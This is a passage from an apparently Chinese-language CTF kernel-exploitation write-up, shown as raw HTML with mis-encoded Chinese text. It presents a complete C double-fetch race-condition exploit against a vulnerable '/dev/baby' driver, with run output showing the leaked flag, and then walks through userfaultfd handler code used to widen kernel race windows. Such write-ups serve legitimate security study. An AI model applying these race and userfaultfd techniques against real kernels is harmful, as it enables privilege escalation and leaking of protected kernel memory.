class="hljs-comment"> *</span><br><span class="hljs-comment"> * This version was originally contributed by Jonas Bonn for the</span><br><span class="hljs-comment"> * OpenRISC architecture, and was found to be the most efficient</span><br><span class="hljs-comment"> * for constant &#x27;size&#x27; and &#x27;limit&#x27; values.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> __access_ok(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> __user *ptr, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> size)<br>&#123;<br>    <span class="hljs-comment">//TASK_SIZE really is a mis-named.  It really is the maximum user</span><br>    <span class="hljs-comment">//space address (plus one).</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> limit = TASK_SIZE_MAX;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)ptr;<br><br>    <span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ALTERNATE_USER_ADDRESS_SPACE) ||<br>        !IS_ENABLED(CONFIG_MMU))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">return</span> (size &lt;= limit) &amp;&amp; (addr &lt;= (limit - size));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™é‡Œçš„<code>TASK_SIZE_MAX</code>-&gt;<code>TASK_SIZE</code>-&gt;<code>DEFAULT_TASK_SIZE</code>-&gt;user space address + 1 = <code>0xa000000000000000</code> </p><p>è‡³äºä¸ºä»€ä¹ˆæ˜¯current_task + 0x1358æ²¡æœ‰æŸ¥åˆ°, è‡³å°‘åœ¨è¿è¡Œæ—¶åˆ»ä»–çš„å€¼ä¸º<code>0x7ffffffff000</code>, å³ç”¨æˆ·ç©ºé—´çš„ä¸Šé™.</p></blockquote><p>æ£€æŸ¥æ—¶è¦æ±‚æŒ‡å‘ç”¨æˆ·åŒº, è¿›å…¥ifè¯­å¥åæ£€æŸ¥å†…å®¹æ˜¯å¦å’Œflagä¸€è‡´. é‚£ä¹ˆåœ¨è¿™ä¹‹é—´å¯ä»¥ç”¨å¦å¤–ä¸€ä¸ªçº¿ç¨‹æ¥åˆ¶é€ ç«æ€æ¡ä»¶, ä¿®æ”¹æŒ‡é’ˆä¸ºå†…æ ¸ç©ºé—´ä¸­çš„flag, è¿™æ ·æ¯”è¾ƒä¸¤ä¸ªç›¸åŒçš„ä¸œè¥¿è‚¯å®šæ˜¯èƒ½é€šè¿‡çš„.</p><p>ç¬¬ä¸€ç‰ˆ:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">size_t</span> flag_kaddr = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *prefix = <span class="hljs-string">&quot;Your flag is at &quot;</span>;<br><span class="hljs-keyword">char</span> *fake_flag = <span class="hljs-string">&quot;0123456789&quot;</span><br>                  <span class="hljs-string">&quot;0123456789&quot;</span><br>                  <span class="hljs-string">&quot;0123456789&quot;</span><br>                  <span class="hljs-string">&quot;012&quot;</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TRY_TIME 8000</span><br><span class="hljs-keyword">u_int8_t</span> flag_finish;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ATTR_t</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> *buf;<br>    <span class="hljs-keyword">size_t</span> len;<br>&#125; attr;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">race_condition</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (flag_finish == <span class="hljs-number">0</span>)<br>        attr.buf = (<span class="hljs-keyword">char</span> *)flag_kaddr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// ioctl to get flag address</span><br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">int</span> baby_fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (baby_fd == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open /dev/baby fail!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    ioctl(baby_fd, <span class="hljs-number">0x6666</span>, <span class="hljs-literal">NULL</span>);<br>    system(<span class="hljs-string">&quot;dmesg &gt; /tmp/mesg&quot;</span>);<br>    FILE *tmp_fd = fopen(<span class="hljs-string">&quot;/tmp/mesg&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">101</span>];<br>    <span class="hljs-keyword">while</span> (fgets(buf, <span class="hljs-number">100</span>, tmp_fd))<br>    &#123;<br>        <span class="hljs-keyword">char</span> *pos;<br>        <span class="hljs-keyword">if</span> (pos = <span class="hljs-built_in">strstr</span>(buf, prefix))<br>            flag_kaddr = strtoull(pos + <span class="hljs-built_in">strlen</span>(prefix), <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the address of flag_kaddr is %p\n&quot;</span>, flag_kaddr);<br>    <span class="hljs-comment">// create new thread to modify attr.flag to kernel flag addr</span><br>    <span class="hljs-comment">// init attr struct</span><br>    attr.buf = (<span class="hljs-keyword">char</span> *)fake_flag;<br>    attr.len = <span class="hljs-number">33</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the len of fake_flag is %d\n&quot;</span>, <span class="hljs-built_in">strlen</span>(fake_flag));<br>    <span class="hljs-keyword">pthread_t</span> race;<br>    pthread_create(&amp;race, <span class="hljs-literal">NULL</span>, race_condition, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// restore to user-space ptr and ioctl(0x1337)</span><br>    ushort time = TRY_TIME;<br>    <span class="hljs-keyword">while</span> (time--)<br>    &#123;<br>        attr.buf = fake_flag;<br>        ioctl(baby_fd, <span class="hljs-number">0x1337</span>, &amp;attr);<br>    &#125;<br><br>    flag_finish = <span class="hljs-number">1</span>;<br>    pthread_join(race, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// output the result</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The result is:&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg | grep flag&#123;&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç„¶åæ¥ç€å‘ç°ç»“æœä¸æ˜¯ç«æ€æ¡ä»¶æ— æ³•æˆåŠŸ, è¦ä¹ˆå°±æ˜¯smp ptié”™è¯¯. å…¶å®æ˜¯<code>strtoull</code>å†™æˆäº†<code>strtoll</code>, å¯¼è‡´æŒ‡é’ˆè½¬æ¢ä¸å¯¹.</p><p>ä¸‹é¢æ˜¯è¿è¡Œç»“æœ:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">/ $ ./newexp                                                                                               <br>the address of flag_kaddr is 0xffffffffc0322028                                                            <br>the len of fake_flag is 33                                                                                 <br>The result is:                                                                                             <br>[    4.191564] Looks like the flag is not a secret anymore. So here is it flag&#123;THIS_WILL_BE_YOUR_FLAG_1234&#125;<br></code></pre></div></td></tr></table></figure><h3 id="userfaultfd-çš„ä½¿ç”¨"><a href="#userfaultfd-çš„ä½¿ç”¨" class="headerlink" title="userfaultfd çš„ä½¿ç”¨"></a>userfaultfd çš„ä½¿ç”¨</h3><blockquote><p>ä»¥ä¸‹æ¥è‡ªCTF-WiKi</p></blockquote><p>userfaultfd å¹¶ä¸æ˜¯ä¸€ç§æ”»å‡»çš„åå­—ï¼Œå®ƒæ˜¯ Linux æä¾›çš„ä¸€ç§è®©ç”¨æˆ·è‡ªå·±å¤„ç†ç¼ºé¡µå¼‚å¸¸çš„æœºåˆ¶ï¼Œåˆè¡·æ˜¯ä¸ºäº†æå‡å¼€å‘çµæ´»æ€§ï¼Œåœ¨ kernel pwn ä¸­å¸¸è¢«ç”¨äºæé«˜æ¡ä»¶ç«äº‰çš„æˆåŠŸç‡ã€‚æ¯”å¦‚åœ¨å¦‚ä¸‹çš„æ“ä½œæ—¶</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">copy<span class="hljs-constructor">_from_user(<span class="hljs-params">kptr</span>, <span class="hljs-params">user_buf</span>, <span class="hljs-params">size</span>)</span>;<br></code></pre></div></td></tr></table></figure><p>å¦‚æœåœ¨è¿›å…¥å‡½æ•°åï¼Œå®é™…æ‹·è´å¼€å§‹å‰çº¿ç¨‹è¢«ä¸­æ–­æ¢ä¸‹ CPUï¼Œåˆ«çš„çº¿ç¨‹æ‰§è¡Œï¼Œä¿®æ”¹äº† kptr æŒ‡å‘çš„å†…å­˜å—çš„æ‰€æœ‰æƒï¼ˆæ¯”å¦‚ kfree æ‰äº†è¿™ä¸ªå†…å­˜å—ï¼‰ï¼Œç„¶åå†æ‰§è¡Œæ‹·è´æ—¶å°±å¯ä»¥å®ç° UAFã€‚è¿™ç§å¯èƒ½æ€§å½“ç„¶æ˜¯æ¯”è¾ƒå°çš„ï¼Œä½†æ˜¯å¦‚æœ user_buf æ˜¯ä¸€ä¸ª mmap çš„å†…å­˜å—ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¸ºå®ƒæ³¨å†Œäº† userfaultfdï¼Œé‚£ä¹ˆåœ¨æ‹·è´æ—¶å‡ºç°ç¼ºé¡µå¼‚å¸¸åæ­¤çº¿ç¨‹ä¼šå…ˆæ‰§è¡Œæˆ‘ä»¬æ³¨å†Œçš„å¤„ç†å‡½æ•°ï¼Œåœ¨å¤„ç†å‡½æ•°ç»“æŸå‰çº¿ç¨‹ä¸€ç›´è¢«æš‚åœï¼Œç»“æŸåæ‰ä¼šæ‰§è¡Œåé¢çš„æ“ä½œï¼Œå¤§å¤§å¢åŠ äº†ç«äº‰çš„æˆåŠŸç‡ã€‚</p><blockquote><p>in man page: userfaultfd - create a file descriptor for handling page faults in user space</p></blockquote><h4 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h4><p>ç„¶åç®€å•è¯´ä¸€ä¸‹ä¸ºå†…å­˜å—æ³¨å†Œ userfaultfd çš„æ–¹æ³•ï¼Œæ¯”è¾ƒè¯¦ç»†ä»‹ç»çš„å¯ä»¥å‚è€ƒ <a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man page</a>ã€‚è¿™ä¸ªman pageæ˜¯åœ¨ç³»ç»Ÿè°ƒç”¨çš„å“ªä¸€ä¸ªsection, è€Œå…·ä½“ä½¿ç”¨è¿˜æœ‰ä¸€ä¸ªpageæ˜¯å¾ˆé‡è¦çš„, åœ¨section7 çš„<a href="https://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html"><code>ioctl_userfaultfd</code></a>. é‡Œé¢æœ‰ç»“æ„ä½“çš„å®šä¹‰å’Œä½¿ç”¨. </p><blockquote><p> O_CLOEXECæ˜¯ä¸ªå•¥: åœ¨æ‰§è¡Œexec()çš„æ—¶å€™å…³é—­è¿™ä¸ªfd.</p></blockquote><blockquote><p>å…³äºuserfaultfd:</p><ul><li>å…³é”®è¯: å¤šçº¿ç¨‹ç¨‹åº ä¸€ä¸ªçº¿ç¨‹page_fault å¦ä¸€ä¸ªçº¿ç¨‹fault_handling</li><li>glibc provides no wrapper for userfaultfd(),<br>necessitating the use of syscall(2): <code>syscall(__NR_userfaultfd, oflags);</code> </li><li>the faulting thread is put to sleep and an event is generated that can be read <em><strong>via the userfaultfd file descriptor</strong></em>.</li><li>more details are as follows:</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ErrExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* err_msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(err_msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RegisterUserfault</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *fault_page,<span class="hljs-keyword">void</span> *handler)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pthread_t</span> thr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">ua</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">ur</span>;</span><br><span class="hljs-comment">//glibc provides no wrapper for userfaultfd(), necessitating the use of syscall as below:</span><br>    <span class="hljs-keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    ua.api = UFFD_API;<br>    ua.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="hljs-number">-1</span>)<br>        ErrExit(<span class="hljs-string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);<br><br>    ur.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)fault_page; <span class="hljs-comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span><br>    ur.range.len   = PAGE_SIZE;<br>    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="hljs-number">-1</span>) <span class="hljs-comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span><br>        <span class="hljs-comment">//å½“å‘ç”Ÿç¼ºé¡µæ—¶ï¼Œç¨‹åºä¼šé˜»å¡ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹é‡Œæ“ä½œ</span><br>        ErrExit(<span class="hljs-string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);<br>    <span class="hljs-comment">//å¼€ä¸€ä¸ªçº¿ç¨‹ï¼Œæ¥æ”¶é”™è¯¯çš„ä¿¡å·ï¼Œç„¶åå¤„ç†</span><br>    <span class="hljs-keyword">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>,handler, (<span class="hljs-keyword">void</span>*)uffd);<br>    <span class="hljs-keyword">if</span> (s!=<span class="hljs-number">0</span>)<br>        ErrExit(<span class="hljs-string">&quot;[-] pthread_create&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬åœ¨æ³¨å†Œçš„æ—¶å€™ï¼Œåªè¦ä½¿ç”¨ç±»ä¼¼äº</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">RegisterUserfault(mmap_buf, handler);<br></code></pre></div></td></tr></table></figure><p>çš„æ“ä½œå°±å¯ä»¥æŠŠ handler å‡½æ•°ç»‘å®šåˆ° mmap_bufï¼Œå½“ mmap_buf å‡ºç°ç¼ºé¡µå¼‚å¸¸æ—¶å°±ä¼šè°ƒç”¨ handler æ¥å¤„ç†ã€‚</p><p>ç„¶åæ¯”è¾ƒé‡è¦çš„æ˜¯ handler çš„å†™æ³•ï¼Œå¼€å¤´æ˜¯ä¸€äº›æ¨¡æ¿åŒ–çš„æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">userfaultfd_leak_handler</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> uffd = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br><span class="hljs-comment">//the number of ready fds.</span><br>    <span class="hljs-keyword">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br><span class="hljs-comment">//returns the number of elements in pollfds whose revents have been set to a non-negative value</span><br><span class="hljs-comment">//poll(struct pollfd *fds, nfds_t nfds, int timeout); (-1 timeout means infinite timeout.)</span><br><span class="hljs-comment">//fds is a array of type pollfd</span><br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>); <br></code></pre></div></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ª uffd_msg ç±»å‹çš„ç»“æ„ä½“åœ¨æœªæ¥æ¥å—æ¶ˆæ¯ã€‚</p><p>éœ€è¦ä¸€ä¸ª pollfd ç±»å‹çš„ç»“æ„ä½“æä¾›ç»™è½®è¯¢æ“ä½œï¼Œå…¶ fd è®¾ç½®ä¸ºä¼ å…¥çš„ argï¼Œevents è®¾ç½®ä¸º POLLINã€‚ç„¶åæ‰§è¡Œ <code>poll(&amp;pollfd, 1, -1);</code> æ¥è¿›è¡Œè½®è¯¢ï¼Œè¿™ä¸ªå‡½æ•°ä¼šä¸€ç›´è¿›è¡Œè½®è¯¢ï¼Œç›´åˆ°å‡ºç°ç¼ºé¡µé”™è¯¯ã€‚</p><p>ç„¶åéœ€è¦å¤„ç†ç¼ºé¡µ</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//here is critical: stop the faulting process.</span><br>    sleep(<span class="hljs-number">3</span>);<br>    <span class="hljs-keyword">if</span> (nready != <span class="hljs-number">1</span>)<br>    &#123;<span class="hljs-comment">//there is only one element in fds, so it must be 1.</span><br>        ErrExit(<span class="hljs-string">&quot;[-] Wrong poll return val&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//uffd will return the msg infomation, so just read from it.</span><br>    nready = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>    <span class="hljs-keyword">if</span> (nready &lt;= <span class="hljs-number">0</span>)<br>        ErrExit(<span class="hljs-string">&quot;[-] msg err&quot;</span>);<br><span class="hljs-comment">//mmap a page. </span><br>    <span class="hljs-keyword">char</span>* page = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>        ErrExit(<span class="hljs-string">&quot;[-] mmap err&quot;</span>);<br><span class="hljs-comment">//The faulted thread will be stopped from execution until the page fault is resolved </span><br><span class="hljs-comment">//from user-space by either an UFFDIO_COPY or an UFFDIO_ZEROPAGE ioctl.</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uc</span>;</span><br>    <span class="hljs-comment">// init page, å‘ƒå‘ƒå‘ƒå‘ƒå‘ƒ, æ€ä¹ˆä¼šæœ‰sizeof(page)è¿™ç§æ“ä½œ.</span><br>    <span class="hljs-comment">// æ•´ä¸ªè¦æ”¹æˆ PAGE_SIZE</span><br>    <span class="hljs-comment">// WRONG: memset(page, 0, sizeof(page));</span><br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-number">0</span>, PAGE_SIZE);<span class="hljs-comment">// CORRECT</span><br>    uc.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br><span class="hljs-comment">//page aligned</span><br>    uc.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="hljs-number">1</span>);<br>    uc.len = PAGE_SIZE;<br>    uc.mode = <span class="hljs-number">0</span>;<br>    uc.copy = <span class="hljs-number">0</span>;<br>    ioctl(uffd, UFFDIO_COPY, &amp;uc);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] leak handler done&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ³¨æ„åœ¨å¼€å¤´åŠ å…¥äº† sleep æ“ä½œï¼Œåœ¨ poll ç»“æŸè¿”å›æ—¶å°±ä»£è¡¨ç€å‡ºç°äº†ç¼ºé¡µäº†ï¼Œæ­¤æ—¶ sleep å°±å¯ä»¥ä¹‹å‰è¯´åˆ°çš„æš‚åœçº¿ç¨‹çš„æ•ˆæœã€‚ç„¶åè¿›è¡Œä¸€äº›åˆ¤æ–­ä»€ä¹ˆçš„ï¼Œå¹¶ mmap ä¸€ä¸ªé¡µç»™ç¼ºé¡µçš„é¡µï¼Œéƒ½æ˜¯æ¨¡æ¿åŒ–çš„æ“ä½œã€‚æ­¤å¤„ mmap çš„å†…å­˜åœ¨ç¼ºé¡µæ—¶æœ‰è‡ªå·±çš„å¤„ç†å‡½æ•°ï¼Œæ‰€ä»¥ä¸ä¼šä¸€ç›´å¥—å¨ƒåœ°ç¼ºé¡µä¸‹å»ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œåœ¨é‡åˆ°è¿”å›å€¼é”™è¯¯çš„æ—¶å€™å°±ç›´æ¥é”™è¯¯é€€å‡ºäº†ï¼Œåœ¨å·¥ç¨‹ä¸Šåº”è¯¥ä¼šè®²ç©¶ä¸€äº›ï¼Œè¿˜ä¼šåœ¨å¤–é¢å¥—ä¸€ä¸ªå¤§æ­»å¾ªç¯ä»€ä¹ˆçš„ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œæ¯•ç«Ÿæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨å®ƒæŠŠçº¿ç¨‹æš‚åœå°±å¯ä»¥äº†ã€‚</p><blockquote><p>å¤´æ–‡ä»¶:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-comment">//#include &lt;errno.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span 